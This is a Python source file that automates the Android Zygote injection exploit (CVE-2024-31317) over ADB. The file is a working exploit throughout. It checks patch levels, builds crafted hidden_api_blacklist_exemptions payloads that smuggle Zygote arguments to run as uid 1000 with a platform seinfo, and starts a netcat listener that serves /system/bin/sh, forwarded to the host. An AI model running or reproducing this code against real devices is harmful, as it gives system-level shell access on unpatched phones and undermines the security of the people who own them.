import socket
import time
import shlex
import datetime
from typing import Optional, Union
from enum import Enum

from zygote_injection_toolkit.exceptions import *

from ppadb.client import Client as AdbClient


class ConnectResult(Enum):
    success = 0
    success_specific_device = 1  # connected to the explicitly specified device
    failed_multiple_devices = 2
    failed_no_devices = 3
    failed_specific_device = 4  # could not find the device

    @property
    def succeeded(self) -> bool:
        return self.value in (self.success, self.success_specific_device)


PropValue = Union[str, int, float, bool]


class Stage1Exploit:
    def __init__(
        self,
        device_serial: Optional[str] = None,
        auto_connect: bool = True,
        adb_client: Optional[AdbClient] = None,
        port: int = 1234
    ) -> None:
        self._port = port
        if adb_client is None:
            self._adb_client = AdbClient()
        else:
            self._adb_client = adb_client
        if auto_connect:
            self.connect(device_serial)

    def connect(self, device_serial: Optional[str]) -> None:
        devices = self._adb_client.devices()
        if device_serial is None:
            if len(devices) == 1:
                device = devices[0]
            elif len(devices) == 0:
                raise ZygoteInjectionNoDeviceException("no devices found")
            else:
                raise ZygoteInjectionMultipleDevicesException(
                    "multiple devices found and no device has been explicitly specified"
                )
        else:
            for current_device in devices:
                if current_device.serial == device_serial:
                    device = current_device
                    break
            else:
                raise ZygoteInjectionDeviceNotFoundException(
                    f"device with serial {repr(device_serial)} was not found"
                )
        self.device = device

    def shell_execute(
        self,
        command: Union[list, str],
        allow_error: bool = False,
        separate_stdout_stderr: bool = True,
        timeout: Optional[float] = None,
    ) -> dict:
        try:
            command + ""
        except TypeError:
            # if a list is passed, treat it as a list of arguments
            escaped_command = shlex.join(command)
        else:
            escaped_command = command

        result = self.device.shell_v2(
            escaped_command,
            separate_stdout_stderr=separate_stdout_stderr,
            timeout=timeout,
        )
        if separate_stdout_stderr:
            stdout, stderr, exit_code = result
        else:
            output, exit_code = result
        if exit_code and not allow_error:
            raise ZygoteInjectionCommandFailedException(
                f'command "{escaped_command}" failed with exit code {exit_code:d}'
            )

        result = {}
        if allow_error:
            result["exit_code"] = exit_code
        if separate_stdout_stderr:
            result["stdout"] = stdout
            result["stderr"] = stderr
        else:
            result["output"] = output
        return result

    def getprop(self, name: str) -> PropValue:
        # get the type and value, removing newlines
        prop_type_result = self.shell_execute(["getprop", "-T", "--", name])
        prop_type = prop_type_result["stdout"]
        if prop_type.endswith("\n"):
            prop_type = prop_type[: -len("\n")]
        prop_value_result = self.shell_execute(["getprop", "--", name])
        prop_value = prop_value_result["stdout"]
        if prop_value.endswith("\n"):
            prop_value = prop_value[: -len("\n")]

        if prop_type == "string" or prop_type.startswith("enum"):
            return prop_value
        elif prop_type in ("int", "uint"):
            return int(prop_value)
        elif prop_type == "double":
            return float(prop_value)
        elif prop_type == "bool":
            if prop_value in ("true", "1"):
                return True
            elif prop_value in ("false", "0"):
                return False
            else:
                raise ValueError(f"invalid literal for bool: {repr(prop_value)}")
        else:
            raise NotImplementedError(f"unsupported property type: {repr(prop_type)}")

    def setprop(self, name: str, value: PropValue) -> None:
        # convert the value to a string so it can be passed to setprop
        if isinstance(value, bool):
            if value:
                value_string = "true"
            else:
                value_string = "false"
        else:
            value_string = str(value)

        self.shell_execute(["setprop", "--", name, value_string])

    def get_setting(self, namespace: str, name: str) -> str:
        result = self.shell_execute(["settings", "get", namespace, name])
        output = result["stdout"]
        if output.endswith("\n"):
            return output[: -len("\n")]
        else:
            return output

    def exploit_type(self) -> str:
        android_version = int(self.getprop("ro.build.version.release"))

        security_patch = self.getprop("ro.build.version.security_patch")
        EXPLOIT_PATCH_DATE = datetime.date(2024, 6, 1)
        # ancient versions don't have the security patch property, but they're not even close to being patched
        if security_patch:
            security_patch_date = datetime.datetime.strptime(
                security_patch, "%Y-%m-%d"
            ).date()
            if security_patch_date >= EXPLOIT_PATCH_DATE:
                raise ZygoteInjectionNotVulnerableException(
                    f'Your latest security patch is at {security_patch_date.strftime("%Y-%m-%d")}, '
                    f'but the exploit was patched on {EXPLOIT_PATCH_DATE.strftime("%Y-%m-%d")} :( '
                    "Sorry!"
                )

        if android_version >= 12:
            return "new"
        else:
            return "old"

    def find_netcat_command(self) -> list:
        "Tries to find the netcat binary"
        NETCAT_COMMANDS = [["toybox", "nc"], ["busybox", "nc"], ["nc"]]
        for command in NETCAT_COMMANDS:
            result = self.shell_execute(command + ["--help"], True)
            if result["exit_code"] == 0:
                return command
        else:
            raise ZygoteInjectionException("netcat binary was not found")

    @staticmethod
    def generate_stage1_exploit(command: str, exploit_type: str) -> str:
        "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
        assert exploit_type in ("old", "new")
        # commas don't work because they're treated as a separator
        assert "," not in command
        raw_zygote_arguments = [
            "--setuid=1000",
            "--setgid=1000",
            "--setgroups=3003",
            "--runtime-args",
            "--seinfo=platform:isSystemServer:privapp:targetSdkVersion=29:complete",
            "--runtime-flags=1",
            "--nice-name=runmenetcat",
            "--invoke-with",
            f"{command}#",
        ]
        zygote_arguments = "\n".join(
            [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
        )
        if exploit_type == "old":
            # https://infosecwriteups.com/exploiting-android-zygote-injection-cve-2024-31317-d83f69265088
            return f"LClass1;->method1(\n{zygote_arguments}"
        elif exploit_type == "new":
            # https://github.com/oddbyte/CVE-2024-31317/blob/main/31317/app/src/main/java/com/fh/exp31317/MainActivity.java
            payload = "\n" * 3000 + "A" * 5157
            payload += zygote_arguments
            payload += "," + ",\n" * 1400
            return payload

    def is_port_open(self, port: int) -> bool:
        "uses netstat to check if the port is open"
        result = self.shell_execute("netstat -tpln")
        for line in result["stdout"].split("\n"):
            split_line = line.split()
            try:
                local_address = split_line[3]
            except IndexError:
                pass
            else:
                if local_address.endswith(f":{port:d}"):
                    return True
        return False

    def exploit_stage1(self) -> bool:
        if self.is_port_open(self._port):
            print("The exploit is already running!")
            self.device.forward("tcp:" + str(self._port), "tcp:" + str(self._port))
            return True

        # make sure the hidden_api_blacklist_exemptions variable is reset
        self.shell_execute(
            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
        )

        exploit_type = self.exploit_type()
        if exploit_type == "new":
            print("Using new (Android 12+) exploit type")
        elif exploit_type == "old":
            print("Using old (pre-Android 12) exploit type")

        netcat_command = self.find_netcat_command()
        parsed_netcat_command = shlex.join(netcat_command)
        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p " + str(self._port) + " -L /system/bin/sh)&"
        exploit_value = self.generate_stage1_exploit(command, exploit_type)
        exploit_command = [
            "settings",
            "put",
            "global",
            "hidden_api_blacklist_exemptions",
            exploit_value,
        ]

        # run the exploit!
        self.shell_execute(["am", "force-stop", "com.android.settings"])
        self.shell_execute(exploit_command)
        time.sleep(0.25)
        self.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])
        print("Zygote injection complete, waiting for code to execute...")

        for current_try in range(20):
            time.sleep(1)
            self.shell_execute(
                ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
            )

            if self.is_port_open(self._port):
                self.device.forward("tcp:" + str(self._port), "tcp:" + str(self._port))
                print("Stage 1 success!")
                return True


        print("Stage 1 failed, reboot and try again")
        # exploit failed, clean up
        self.shell_execute(
            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
        )
        return False
